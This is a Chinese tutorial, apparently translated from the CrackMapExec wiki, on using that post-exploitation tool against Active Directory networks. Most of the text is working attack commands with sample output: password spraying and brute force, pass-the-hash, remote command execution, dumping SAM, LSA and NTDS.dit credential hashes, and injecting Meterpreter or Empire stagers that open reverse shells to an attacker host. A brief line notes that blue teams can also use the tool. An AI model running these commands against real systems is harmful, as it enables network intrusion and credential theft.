**[CrackMapExec（CME）](https://github.com/byt3bl33d3r/CrackMapExec)是一款后渗透利用工具，可帮助自动化大型活动目录(AD)网络安全评估任务。其缔造者[@byt3bl33d3r](https://twitter.com/byt3bl33d3r)称，该工具的生存概念是，“利用AD内置功能/协议达成其功能，并规避大多数终端防护/IDS/IPS解决方案。”**  

**![d312ceb4-5f3b-11e6-8de5-8822246289fd.jpg](https://image.3001.net/images/20180915/1536977917_5b9c6bfd9e8d0.jpg!small)**

尽管该项目主要用于攻击性目的（例如红队），但蓝队同样可以使用该工具来评估账户权限，模拟攻击，查找配置错误。CME还使用[PowerSploit工具包](https://github.com/PowerShellMafia/PowerSploit)和[Impacket](https://github.com/CoreSecurity/impacket)库。

## 安装

 **重要：** 在以下所有Bleeding-Edge安装说明中，请注意传递给git clone命令的--recursive标志。该标志会让git自动下载CME所依赖的所有子模块。如果没有的话，安装将会失败。

## Kali

 **最新稳定版**

    
    
    #~ apt-get install crackmapexec

 **Bleeging-Edge**

强烈建议使用[pipenv](https://pipenv.readthedocs.io/en/latest/)来安装CME，以避免依赖项与你的系统包产生冲突。

    
    
    #~ apt-get install -y libssl-dev libffi-dev python-dev build-essential
    #~ pip install --user pipenv
    #~ git clone --recursive https://github.com/byt3bl33d3r/CrackMapExec
    #~ cd CrackMapExec && pipenv install
    #~ pipenv shell
    #~ python setup.py install

## Debian/Ubuntu

强烈建议使用[pipenv](https://pipenv.readthedocs.io/en/latest/)来安装CME，以避免依赖项与你的系统包产生冲突。

 **最新稳定版**

    
    
    #~ apt-get install -y libssl-dev libffi-dev python-dev build-essential
    #~ pip install crackmapexec

 **Bleeging-Edge**

    
    
    #~ apt-get install -y libssl-dev libffi-dev python-dev build-essential
    #~ pip install --user pipenv
    #~ git clone --recursive https://github.com/byt3bl33d3r/CrackMapExec
    #~ cd CrackMapExec && pipenv install
    #~ pipenv shell
    #~ python setup.py install

## Arch Linux

强烈建议使用[pipenv](https://pipenv.readthedocs.io/en/latest/)来安装CME，以避免依赖项与你的系统包产生冲突。

 **最新稳定版**

    
    
    pip install crackmapexec

 **Bleeging-Edge**

    
    
    #~ pip install --user pipenv
    #~ git clone --recursive https://github.com/byt3bl33d3r/CrackMapExec
    #~ cd CrackMapExec && pipenv install
    #~ pipenv shell
    #~ python setup.py install

## Mac OSX

强烈建议使用[pipenv](https://pipenv.readthedocs.io/en/latest/)来安装CME，以避免依赖项与你的系统包产生冲突。

 **最新稳定版**

    
    
    pip install --user crackmapexec

 **Bleeging-Edge**

    
    
    #~ pip install --user pipenv
    #~ git clone --recursive https://github.com/byt3bl33d3r/CrackMapExec
    #~ cd CrackMapExec && pipenv install
    #~ pipenv shell
    #~ python setup.py install

## Logs

CME输出的任何日志文件都将存储在~/.cme/logs中。

## 使用协议

从v4开始，CME将其功能划分为简化/组合/模块化（simplify/orginize/modularize）参数解析和功能，并允许将CME的功能扩展至Active
Directory之外。

要使用特定协议，请运行：cme <协议> <协议选项>

## 查看可用协议

运行cme --help将列出可用的常规选项和协议：

    
    
    #~ cme --help
    usage: cme [-h] [-v] [-t THREADS] [--timeout TIMEOUT] [--jitter INTERVAL]
               [--darrell] [--verbose]
               {http,smb,mssql} ...
    
          ______ .______           ___        ______  __  ___ .___  ___.      ___      .______    _______ ___   ___  _______   ______
         /      ||   _  \         /   \      /      ||  |/  / |   \/   |     /   \     |   _  \  |   ____|\  \ /  / |   ____| /      |
        |  ,----'|  |_)  |       /  ^  \    |  ,----'|  '  /  |  \  /  |    /  ^  \    |  |_)  | |  |__    \  V  /  |  |__   |  ,----'
        |  |     |      /       /  /_\  \   |  |     |    <   |  |\/|  |   /  /_\  \   |   ___/  |   __|    >   <   |   __|  |  |
        |  `----.|  |\  \----. /  _____  \  |  `----.|  .  \  |  |  |  |  /  _____  \  |  |      |  |____  /  .  \  |  |____ |  `----.
         \______|| _| `._____|/__/     \__\  \______||__|\__\ |__|  |__| /__/     \__\ | _|      |_______|/__/ \__\ |_______| \______|
    
                                             A swiss army knife for pentesting networks
                                        Forged by @byt3bl33d3r using the powah of dank memes
    
                                                          Version: 4.0.0dev
                                                         Codename: 'Sercurty'
    
    optional arguments:
      -h, --help         show this help message and exit
      -v, --version      show program's version number and exit
      -t THREADS         set how many concurrent threads to use (default: 100)
      --timeout TIMEOUT  max timeout in seconds of each thread (default: None)
      --jitter INTERVAL  sets a random delay between each connection (default: None)
      --darrell          give Darrell a hand
      --verbose          enable verbose output
    
    protocols:
      available protocols
    
      {http,smb,mssql}
        http             own stuff using HTTP(S)
        smb              own stuff using SMB and/or Active Directory
        mssql            own stuff using MSSQL and/or Active Directory
    
    Serrrrrrcuuurrrty?

## 查看协议选项

运行cme <protocol> \--help 查看指定协议所支持的选项。例如，查看所有SMB协议选项：

    
    
    #~ cme smb --help
    usage: cme smb [-h] [-id CRED_ID [CRED_ID ...]] [-u USERNAME [USERNAME ...]]
                   [-p PASSWORD [PASSWORD ...]]
                   [--gfail-limit LIMIT | --ufail-limit LIMIT | --fail-limit LIMIT]
                   [-M MODULE] [-o MODULE_OPTION [MODULE_OPTION ...]] [-L]
                   [--options] [--server {http,https}] [--server-host HOST]
                   [--server-port PORT] [-H HASH [HASH ...]]
                   [-d DOMAIN | --local-auth] [--smb-port {139,445}]
                   [--share SHARE] [--gen-relay-list OUTPUT_FILE]
                   [--sam | --lsa | --ntds {vss,drsuapi}] [--shares] [--sessions]
                   [--disks] [--loggedon-users] [--users [USER]]
                   [--groups [GROUP]] [--local-groups [GROUP]] [--pass-pol]
                   [--rid-brute [MAX_RID]] [--wmi QUERY]
                   [--wmi-namespace NAMESPACE] [--spider SHARE]
                   [--spider-folder FOLDER] [--content] [--exclude-dirs DIR_LIST]
                   [--pattern PATTERN [PATTERN ...] | --regex REGEX [REGEX ...]]
                   [--depth DEPTH] [--only-files]
                   [--exec-method {mmcexec,smbexec,wmiexec,atexec}] [--force-ps32]
                   [--no-output] [-x COMMAND | -X PS_COMMAND]
                   [target [target ...]]
    
    positional arguments:
      target                the target IP(s), range(s), CIDR(s), hostname(s),
                            FQDN(s) or file(s) containg a list of targets
    
    optional arguments:
      -h, --help            show this help message and exit
      -id CRED_ID [CRED_ID ...]
                            database credential ID(s) to use for authentication
      -u USERNAME [USERNAME ...]
                            username(s) or file(s) containing usernames
      -p PASSWORD [PASSWORD ...]
                            password(s) or file(s) containing passwords
      --gfail-limit LIMIT   max number of global failed login attempts
      --ufail-limit LIMIT   max number of failed login attempts per username
      --fail-limit LIMIT    max number of failed login attempts per host
      -M MODULE, --module MODULE
                            payload module to use
      -o MODULE_OPTION [MODULE_OPTION ...]
                            payload module options
      -L, --list-modules    list available modules
      --options             display module options
      --server {http,https}
                            use the selected server (default: https)
      --server-host HOST    IP to bind the server to (default: 0.0.0.0)
      --server-port PORT    start the server on the specified port
      -H HASH [HASH ...], --hash HASH [HASH ...]
    
    -- SNIP --
## 目标格式

每个协议都支持以CIDR表示法，IP地址，IP范围，主机名或包含目标列表的文件格式。

    
    
    crackmapexec <protocol> ms.evilcorp.org
    
    
    crackmapexec <protocol> 192.168.1.0 192.168.0.2
    
    
    crackmapexec <protocol> 192.168.1.0/24
    
    
    crackmapexec <protocol> 192.168.1.0-28 10.0.0.1-67
    
    
    crackmapexec <protocol> ~/targets.txt

## 使用凭据

当你需要使用凭据时，你可以运行以下命令：

    
    
    crackmapexec <protocol> <target(s)> -u username -p password

 **注意1：** 使用包含特殊符号的用户名和密码时，请用单引号将它们包起来，这样shell才会将它们作为字符串解析。

示例：

    
    
    crackmapexec <protocol> <target(s)> -u username -p 'Admin!123@'

 **注意2：** 由于Python的参数解析库中存在[bug](https://bugs.python.org/issue9334)，以短划线（ -）开头的凭据将抛出至少一个参数错误消息。要解决此问题，请使用“long”参数格式指定凭据（请注意=符号）：

    
    
    crackmapexec <protocol> <target(s)> -u='-username' -p='-Admin!123@'

## 使用数据库中的凭据集

通过使用-id标志指定凭据ID（或多个凭证ID），CME将自动从后端数据库中提取该凭据，并用它进行身份验证：

    
    
    crackmapexec <protocol> <target(s)> -id <cred ID(s)>

##  **爆破** & **Password Spraying**

所有协议都支持暴力破解和密码喷洒（Password Spraying）。有关使用特定协议进行暴力破解/密码喷洒的详细信息，请参阅wiki的相应部分。

通过指定一个文件或多个值，CME将使用指定协议自动爆破登录所有目标：

示例：

    
    
    crackmapexec <protocol> <target(s)> -u username1 -p password1 password2
    
    
    crackmapexec <protocol> <target(s)> -u username1 username2 -p password1
    
    
    crackmapexec <protocol> <target(s)> -u ~/file_containing_usernames -p ~/file_containing_passwords
    
    
    crackmapexec <protocol> <target(s)> -u ~/file_containing_usernames -H ~/file_containing_ntlm_hashes

## 使用模块

从v3.1开始，模块的加载和使用方式发生了变化，以使CME更具可移植性并可被打包。

v4.0的每个协议现在都可以拥有自己的模块集。

## 查看协议的可用模块

运行 cme <protocol> -L 查看指定协议的可用模块。

例如，查看SMB协议的所有模块：

    
    
    #~ cme smb -L
    [*] met_inject                Downloads the Meterpreter stager and injects it into memory
    [*] get_keystrokes            Logs keys pressed, time and the active window
    [*] empire_exec               Uses Empire's RESTful API to generate a launcher for the specified listener and executes it
    
    -- SNIP --
## 使用模块

运行 cme <protocol> <target(s)> -M <module name>。

例如，运行SMB Mimikatz模块：

    
    
    #~ crackmapexec smb <target(s)> -u Administrator -p 'P@ssw0rd' -M mimikatz

## 查看模块选项

运行 cme <protocol> -M <模块名称> \--options 查看模块所支持的选项，例如：

    
    
    #~ cme smb -M mimikatz --options

## 使用模块选项

使用-o标志指定模块选项。所有选项都以KEY=value (msfvenom style)的形式指定。

示例：

    
    
    #~ cme <protocol> <target(s)> -u Administrator -p 'P@ssw0rd' -M mimikatz -o COMMAND='privilege::debug'

## 数据库常规用法

CME会自动将所有使用/转储的凭证（以及其他信息），存储在首次运行时设置的数据库中。

从CME v4开始，每个协议都有自己的数据库。此外，v4引入了workspaces（类似于Metasploit）。

有关特定协议数据库的详细信息和用法，请参阅Wiki的相应部分。

所有workspaces及其相关数据库都存储在~/.cme/workspaces中。

## 与数据库交互

CME附带了一个辅助命令行脚本cmedb，用于与后端数据库的交互。 键入命令cmedb进入命令shell：

    
    
    #~ cmedb
    cmedb (default) >

## Workspaces

默认workspace的名称为'default'（如提示中所示）。一旦你选择了workspace，那么你在CME中执行的所有操作都将存储在该workspace中。

创建工作区：

    
    
    cmedb (default) > workspace create test
    [*] Creating workspace 'test'
    [*] Initializing HTTP protocol database
    [*] Initializing SMB protocol database
    [*] Initializing MSSQL protocol database
    cmedb (test) >

切换工作区：

    
    
    cmedb (test) > workspace default
    cmedb (default) >

## 访问协议的数据库

要访问协议的数据库，只需运行proto <protocol>，例如：

    
    
    cmedb (test) > proto smb
    cmedb (test)(smb) >

正如你在提示中看到的那样，我们现在位于名为“test”的工作区中，并使用SMB协议的数据库。每个协议数据库都有自己的一组命令，你可以运行help命令来查看可用选项。

有关特定协议数据库的详细信息和用法，请参阅Wiki的相应部分。

切换协议数据库：

    
    
    cmedb (test)(smb) > back
    cmedb (test) > proto http
    cmedb (test)(http) >

## SMB协议

 **Passing-the-Hash**

CME支持使用带-H标志的Passing-The-Hash攻击通过SMB进行身份验证：

    
    
    crackmapexec smb <target(s)> -u username -H LMHASH:NTHASH
    
    
    crackmapexec smb <target(s)> -u username -H NTHASH

 **NULL Sessions**

你可以使用''作为用户名和/或密码，即空会话登录

示例：

    
    
    crackmapexec smb <target(s)> -u '' -p ''

 **使用SMB数据库**

待完成~

 **从Empire和Metasploit导入凭据**

CME非常适合作为Exploit/Post-Exploitation框架之间的“粘合剂”。为此我们添加了许多功能，以便尽可能轻松地让使用者从Empire和Metasploit导入凭据和信息。

 **从Empire导入凭据**

cmedb命令行脚本可以使用它的RESTful
API，直接导入存储在Empire数据库中的凭据，从而使Empire无缝重放转储凭据。有关cmedb脚本和CME数据库的更多信息，请参阅：<https://github.com/byt3bl33d3r/CrackMapExec/wiki/Using-the-Database>

首先，启动Empire的RESTful API服务器：

    
    
    #~ python empire --rest --user empireadmin --pass Password123!
    
    [*] Loading modules from: /home/byt3bl33d3r/Tools/Empire/lib/modules/
     * Starting Empire RESTful API on port: 1337
     * RESTful API token: l5l051eqiqe70c75dis68qjheg7b19di7n8auzml
     * Running on https://0.0.0.0:1337/ (Press CTRL+C to quit)

CME用于向Empire的RESTful API进行身份验证的用户名和密码存储在~/.cme/cme.conf文件中：

    
    
    [Empire]
    api_host=127.0.0.1
    api_port=1337
    username=empireadmin
    password=Password123!
    
    [Metasploit]
    rpc_host=127.0.0.1
    rpc_port=55552
    password=abc123

导入Empire的凭据，只需启动cmedb脚本并运行import empire命令：

    
    
    #~ cmedb
    cmedb > creds
    
    Credentials:
    
      CredID  Admin On     CredType    Domain           UserName             Password
      ------  --------     --------    ------           --------             --------    
    cmedb > import empire
    [+] Empire credential import successful
    cmedb > creds
    
    Credentials:
    
      CredID  Admin On     CredType    Domain           UserName             Password
      ------  --------     --------    ------           --------             --------      1       0 Host(s)    hash        lab.local        yomama               e19ccf75ee54e06b06a5907af13cef42
      2       0 Host(s)    plaintext   lab.local        yomama               P@ssw0rd         
    
    cmedb >

 **从Metasploit导入凭据**

即将实现~

## Getting Shells 101

## Empire Agent

我们可以使用empire_exec模块，来执行Empire Agent的初始stager。在后台，模块连接到Empire的RESTful
API，并为指定的listener生成launcher并执行它。

首先，设置一个Empire listener：

    
    
    (Empire: listeners) > set Name test
    (Empire: listeners) > set Host 192.168.10.3
    (Empire: listeners) > set Port 9090
    (Empire: listeners) > set CertPath data/empire.pem
    (Empire: listeners) > run
    (Empire: listeners) > list
    
    [*] Active listeners:
    
      ID    Name              Host                                 Type      Delay/Jitter   KillDate    Redirect Target
      --    ----              ----                                 -------   ------------   --------    ---------------      1     test              http://192.168.10.3:9090                 native    5/0.0                      
    
    (Empire: listeners) >

启动Empire的RESTful API服务器：

    
    
    #~ python empire --rest --user empireadmin --pass Password123!
    
    [*] Loading modules from: /home/byt3bl33d3r/Tools/Empire/lib/modules/
     * Starting Empire RESTful API on port: 1337
     * RESTful API token: l5l051eqiqe70c75dis68qjheg7b19di7n8auzml
     * Running on https://0.0.0.0:1337/ (Press CTRL+C to quit)

CME用于向Empire的RESTful API进行身份验证的用户名和密码存储在~/.cme/cme.conf文件中：

    
    
    [Empire]
    api_host=127.0.0.1
    api_port=1337
    username=empireadmin
    password=Password123!
    
    [Metasploit]
    rpc_host=127.0.0.1
    rpc_port=55552
    password=abc123

然后运行empire_exec模块，并指定listener名称：

    
    
    #~ crackmapexec 192.168.10.0/24 -u username -p password -M empire_exec -o LISTENER=test

## Meterpreter

我们可以使用metinject模块，使用PowerSploit的Invoke-Shellcode.ps1脚本直接将meterpreter注入到内存。

首先，设置handler处理程序：

    
    
    msf > use exploit/multi/handler 
    msf exploit(handler) > set payload windows/meterpreter/reverse_https
    payload => windows/meterpreter/reverse_https
    msf exploit(handler) > set LHOST 192.168.10.3
    LHOST => 192.168.10.3
    msf exploit(handler) > set exitonsession false
    exitonsession => false
    msf exploit(handler) > exploit -j
    [*] Exploit running as background job.
    
    [*] Started HTTPS reverse handler on https://192.168.10.3:8443
    msf exploit(handler) > [*] Starting the payload handler...

然后运行metinject模块，并指定LHOST和LPORT的值：

    
    
    #~ crackmapexec 192.168.10.0/24 -u username -p password -M metinject -o LHOST=192.168.10.3 LPORT=8443

## 命令执行

在Windows系统上执行命令需要拥有管理员凭据，CME会在身份验证成功时通过向输出添加 '(Pwn3d!)'
来自动告诉你正在使用的凭据集是否具有对主机的管理访问权限。

有关如何使用凭据的详细信息，请参阅凭据部分。

## 执行方法

CME有三种不同的命令执行方法：

1.wmiexec：通过WMI执行命令

2.atexe：通过Windows任务调度程序调度任务来执行命令

3.smbexec：通过创建和运行服务来执行命令

默认情况下，CME将按以下顺序执行命令（如果失败逐一尝试）：

1.wmiexec

2.atexec

3.smbexec

如果你想要指定命令执行的方法，可以使用--exec-method标志。

## 执行命令

在下面的示例中，我们尝试使用-x标志在目标上执行whoami命令：

    
    
    #~ crackmapexec 192.168.10.11 -u Administrator -p 'P@ssw0rd' -x whoami
    06-05-2016 14:34:35 CME          192.168.10.11:445 WIN7BOX         [*] Windows 6.1 Build 7601 (name:WIN7BOX) (domain:LAB)
    06-05-2016 14:34:35 CME          192.168.10.11:445 WIN7BOX         [+] LAB\Administrator:P@ssw0rd (Pwn3d!)
    06-05-2016 14:34:39 CME          192.168.10.11:445 WIN7BOX         [+] Executed command 
    06-05-2016 14:34:39 CME          192.168.10.11:445 WIN7BOX         lab\administrator
    06-05-2016 14:34:39 [*] KTHXBYE!

你还可以使用-X标志来直接执行PowerShell命令：

    
    
    #~ crackmapexec 192.168.10.11 -u Administrator -p 'P@ssw0rd' -X '$PSVersionTable'
    06-05-2016 14:36:06 CME          192.168.10.11:445 WIN7BOX         [*] Windows 6.1 Build 7601 (name:WIN7BOX) (domain:LAB)
    06-05-2016 14:36:06 CME          192.168.10.11:445 WIN7BOX         [+] LAB\Administrator:P@ssw0rd (Pwn3d!)
    06-05-2016 14:36:10 CME          192.168.10.11:445 WIN7BOX         [+] Executed command 
    06-05-2016 14:36:10 CME          192.168.10.11:445 WIN7BOX         Name                           Value
    06-05-2016 14:36:10 CME          192.168.10.11:445 WIN7BOX         ----                           -----    06-05-2016 14:36:10 CME          192.168.10.11:445 WIN7BOX         CLRVersion                     2.0.50727.5420
    06-05-2016 14:36:10 CME          192.168.10.11:445 WIN7BOX         BuildVersion                   6.1.7601.17514
    06-05-2016 14:36:10 CME          192.168.10.11:445 WIN7BOX         PSVersion                      2.0
    06-05-2016 14:36:10 CME          192.168.10.11:445 WIN7BOX         WSManStackVersion              2.0
    06-05-2016 14:36:10 CME          192.168.10.11:445 WIN7BOX         PSCompatibleVersions           {1.0, 2.0}
    06-05-2016 14:36:10 CME          192.168.10.11:445 WIN7BOX         SerializationVersion           1.1.0.1
    06-05-2016 14:36:10 CME          192.168.10.11:445 WIN7BOX         PSRemotingProtocolVersion      2.1
    06-05-2016 14:36:10 [*] KTHXBYE!

Powershell命令可以强制在32位进程中运行：

    
    
    #~ crackmapexec 192.168.10.11 -u Administrator -p 'P@ssw0rd' -X '[System.Environment]::Is64BitProcess' --force-ps32
    SMB         192.168.10.11    445    WIN7BOX          [*] Windows 7 Ultimate N 7601 Service Pack 1 x64 (name:WIN7BOX) (domain:LAB) (signing:False) (SMBv1:True)
    SMB         192.168.10.11    445    WIN7BOX          [+] LAB\Administrator:P@ssw0rd (Pwn3d!)
    SMB         192.168.10.11    445    WIN7BOX          [+] Executed command
    SMB         192.168.10.11    445    WIN7BOX          false

其他开关包括：

    
    
    --no-output       Does not retrieve command results

## 相关命令参考

 **SMB：命令参考**

以下我们假设你已将Kali Linux主机连接到内网，且主机的IP段为192.168.1.0/24。如果CME没有任何的输出，则可能是你的命令有误。

 **映射/枚举**

 **映射网络主机**

返回存活主机列表

    
    
    #~ cme smb 192.168.1.0/24

结果如下：

    
    
    SMB         192.168.1.101    445    DC2012A          [*] Windows Server 2012 R2 Standard 9600 x64 (name:DC2012A) (domain:OCEAN) (signing:True) (SMBv1:True)
    SMB         192.168.1.102    445    DC2012B          [*] Windows Server 2012 R2 Standard 9600 x64 (name:DC2012B) (domain:EARTH) (signing:True) (SMBv1:True)
    SMB         192.168.1.110    445    DC2016A          [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:DC2016A) (domain:OCEAN) (signing:True) (SMBv1:True)
    SMB         192.168.1.117    445    WIN10DESK1       [*] WIN10DESK1 x64 (name:WIN10DESK1) (domain:OCEAN) (signing:False) (SMBv1:True)

 **生成中继列表**

映射实时网络主机并仅保存需要SMB签名的主机列表。列表格式为每行一个IP。

    
    
    #~ cme smb 192.168.1.0/24 --gen-relay-list relaylistOutputFilename.txt

结果如下：

    
    
    SMB         192.168.1.101    445    DC2012A          [*] Windows Server 2012 R2 Standard 9600 x64 (name:DC2012A) (domain:OCEAN) (signing:True) (SMBv1:True)
    SMB         192.168.1.102    445    DC2012B          [*] Windows Server 2012 R2 Standard 9600 x64 (name:DC2012B) (domain:EARTH) (signing:True) (SMBv1:True)
    SMB         192.168.1.111    445    SERVER1          [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:SERVER1) (domain:PACIFIC) (signing:False) (SMBv1:True)
    SMB         192.168.1.117    445    WIN10DESK1       [*] WIN10DESK1 x64 (name:WIN10DESK1) (domain:OCEAN) (signing:False) (SMBv1:True)
    ...SNIP...
    
    #~ cat relaylistOutputFilename.txt
    192.168.1.111
    192.168.1.117

 **枚举共享**

    
    
    #~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --shares

 **枚举有效sessions**

    
    
    #~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sessions

 **枚举磁盘**

    
    
    #~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --disks

 **枚举登录用户**

    
    
    #~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --loggedon-users

 **枚举域用户**

    
    
    #~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --users

 **通过爆破RID枚举用户**

    
    
    #~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --rid-brute

 **枚举域组**

    
    
    #~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --groups

 **枚举本地组**

    
    
    #~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --local-groups

 **获取域密码策略**

    
    
    #~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --pass-pol

## 身份验证+凭据检查（域）

登录失败 [ - ]  
成功登录 [+] Domain\Username:Password

本地管理员访问结果在登录确认后添加了（Pwn3d！），如下所示。

    
    
    SMB         192.168.1.101    445    HOSTNAME          [+] DOMAIN\Username:Password (Pwn3d!) 

以下检查将尝试对整个/24网段进行身份验证，你也可以针对单个目标。

 **User/Password**

    
    
    #~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE'

 **User/Hash**

获取凭据后例如：

Administrator:500:aad3b435b51404eeaad3b435b51404ee:13b29964cc2480b4ef454c59562e675c:::

你可以使用完整哈希或只使用nt哈希（后半部分）

    
    
    #~ cme smb 192.168.1.0/24 -u UserNAme -H 'LM:NT'
    #~ cme smb 192.168.1.0/24 -u UserNAme -H 'NTHASH'
    #~ cme smb 192.168.1.0/24 -u Administrator -H '13b29964cc2480b4ef454c59562e675c'
    #~ cme smb 192.168.1.0/24 -u Administrator -H 'aad3b435b51404eeaad3b435b51404ee:13b29964cc2480b4ef454c59562e675c'

 **Null Sessions**

    
    
    #~ cme smb 192.168.1.0/24 -u '' -p ''

如果有多个域正在运行，你可能需要使用-d来指定目标域。例如，对labnet.com域进行身份验证。

    
    
    #~ cme smb 192.168.1.0/24 -u UserNAme -p "PASSWORDHERE" -d LABNET

 **使用Username/Password列表**

你可以以空格分隔 名称/密码 的形式使用多个用户名和密码。

    
    
    #~ cme smb 192.168.1.101 -u user1 user2 user3 -p Summer18
    #~ cme smb 192.168.1.101 -u user1 -p password1 password2 password3

CME接受包含用户名和密码的txt文件（每行一个用户/密码）。注意帐户锁定！

    
    
    #~ cme smb 192.168.1.101 -u /path/to/users.txt -p Summer18
    #~ cme smb 192.168.1.101 -u Administrator -p /path/to/passwords.txt

*注意*：在默认情况下，CME将在成功登录后退出。如果你并不想退出，可以使用--continue-on-success标志。
    
    
    #~ cme smb 192.168.1.101 -u /path/to/users.txt -p Summer18 --continue-on-success

## 身份验证/凭据检查（本地）

将--local-auth添加到任何身份验证命令并尝试在本地登录。

    
    
    #~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --local-auth
    #~ cme smb 192.168.1.0/24 -u '' -p '' --local-auth
    #~ cme smb 192.168.1.0/24 -u UserNAme -H 'LM:NT' --local-auth
    #~ cme smb 192.168.1.0/24 -u UserNAme -H 'NTHASH' --local-auth
    #~ cme smb 192.168.1.0/24 -u localguy -H '13b29964cc2480b4ef454c59562e675c' --local-auth
    #~ cme smb 192.168.1.0/24 -u localguy -H 'aad3b435b51404eeaad3b435b51404ee:13b29964cc2480b4ef454c59562e675c' --local-auth

结果如下：

    
    
    SMB         192.168.1.101    445    HOSTNAME          [+] HOSTNAME\Username:Password (Pwn3d!)  

## 获取凭证

以下示例使用用户名和明文密码，尽管用户/散列组合也可以使用。

需要目标域控制器上的域管理员或本地管理员权限。

 **使用secretsdump.py中的方法转储SAM哈希值**

    
    
    #~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam

 **使用secretsdump.py中的方法转储LSA secrets**

    
    
    #~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa

 **使用secretsdump.py中的方法从目标DC转储NTDS.dit**

    
    
    2 methods are available:   
    (default) 	drsuapi -  Uses drsuapi RPC interface create a handle, trigger replication, and combined with   
                additional drsuapi calls to convert the resultant linked-lists into readable format  
          vss - Uses the Volume Shadow copy Service  
    
    
    #~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
    #~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss

 **使用secretsdump.py中的方法从目标DC转储NTDS.dit密码历史记录**

    
    
    #~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history

 **显示每个NTDS.dit帐户的pwdLastSet属性**

    
    
    #~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet

## Spidering Shares

用于spider远程系统共享。

 **spider C盘中文件名中带有txt的文件（找到sometxtfile.html和somefile.txt）**

 **注意：** '$'字符必须进行转义。

    
    
    #~ cme SMB <IP> -u USER -p PASSWORD --spider C\$ --pattern txt

 **WMI查询执行**

有关wmi查询及语法的更多信息，请参阅：<https://docs.microsoft.com/en-us/windows/desktop/wmisdk/invoking-a-synchronous-query>

 **发出指定的WMI查询**

User/Password

    
    
    #~ cme smb 10.10.33.121 -u Administrator -p 'P@ssw0rd' --wmi "SELECT * FROM Win32_logicalDisk WHERE DeviceID = 'C:'"
    SMB         192.168.10.11    445    WIN7BOX         [*] Windows 7 Ultimate N 7601 Service Pack 1 x64 (name:WIN7BOX) (domain:LAB) (signing:False) (SMBv1:True)
    SMB         192.168.10.11    445    WIN7BOX         [+] LAB\Administrator:P@ssw0rd (Pwn3d!)
    SMB         192.168.10.11    445    WIN7BOX         Caption => C:
    SMB         192.168.10.11    445    WIN7BOX         Description => Local Fixed Disk
    SMB         192.168.10.11    445    WIN7BOX         InstallDate => 0
    SMB         192.168.10.11    445    WIN7BOX         Name => C:
    SMB         192.168.10.11    445    WIN7BOX         Status => 0
    SMB         192.168.10.11    445    WIN7BOX         Availability => 0
    SMB         192.168.10.11    445    WIN7BOX         CreationClassName => Win32_LogicalDisk
    SMB         192.168.10.11    445    WIN7BOX         ConfigManagerErrorCode => 0
    SMB         192.168.10.11    445    WIN7BOX         ConfigManagerUserConfig => 0
    SMB         192.168.10.11    445    WIN7BOX         DeviceID => C:

 **WMI Namespace**

User/Password

    
    
    #~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --wmi-namespace 'root\\cimv2'

## HTTP：命令参考

以下我们假设你已将Kali Linux主机连接到内网，且主机的IP段为192.168.1.0/24。如果CME没有任何的输出，则可能是你的命令有误。

 **Own stuff using HTTP**

需要安装phantomjs。如果你是通过apt-get进行安装的话，请先删除该版本，然后再从网站安装。

    
    
    >wget https://bitbucket.org/ariya/phantomjs/downloads/phantomjs-2.1.1-linux-x86_64.tar.bz2
    >tar xvjf phantomjs-2.1.1-linux-x86_64.tar.bz2
    >mv phantomjs-2.1.1-linux-x86_64/bin/phantomjs /bin/
    >phantomjs -v

 **映射/枚举**

 **识别HTTP(S)服务器和指纹**

返回实时webservers和banners列表

默认检查：80,443,8443,8008,8080,8081 端口

    
    
    #~ cme http 192.168.1.0/24

结果如下：

    
    
    HTTP        192.168.1.117    8080   192.168.1.117     [*] http://192.168.1.117:8080/ (Server: Apache-Coyote/1.1) (Page Title: Apache Tomcat)
    HTTP        192.168.1.117    80     192.168.1.117     [*] http://192.168.1.117/install/login (Server: Apache/2.4.18 (Ubuntu)) (Page Title: HackME)
    HTTP        192.168.1.120    80     192.168.1.120     [*] http://192.168.1.120/default.html (Server: IIS/8.5 (ASP.NET)) (Page Title: Welcome)
    HTTP        192.168.1.125    443    192.168.1.125     [*] https://192.168.1.125/ (Server: Jetty/8.0 ()) (Page Title: QuickStart)

 **指定端口**

    
    
    #~ cme http 192.168.1.0/24 --port 80 81 82 8080

 **指定协议**

    
    
    #~ cme http 192.168.1.0/24 --transports http

所在页面截图，并以 IP:Port_Year-month-day_time.png的格式保存在“/.cme/logs”目录下。

    
    
    #~ cme http 192.168.1.117 --port 80 81 82 8080 --screenshot
    HTTP        192.168.1.117    8080   192.168.1.117     [*] http://192.168.1.117:8080/ (Server: Apache-Coyote/1.1) (Page Title: Apache Tomcat)
    HTTP        192.168.1.117    80     192.168.1.117     [*] http://192.168.1.117/install/login (Server: Apache/2.4.18 (Ubuntu)) (Page Title: HackME)
    HTTP        192.168.1.117    8080   192.168.1.117     [+] Screenshot stored at /root/.cme/logs/192.168.1.117:8080_2018-08-29_093828.png
    HTTP        192.168.1.117    80     192.168.1.117     [+] Screenshot stored at /root/.cme/logs/192.168.1.117:80_2018-08-29_093828.png

 ***参考来源：[github](https://github.com/byt3bl33d3r/CrackMapExec/wiki)，FB小编
secist 编译，转载请注明来自FreeBuf.COM**

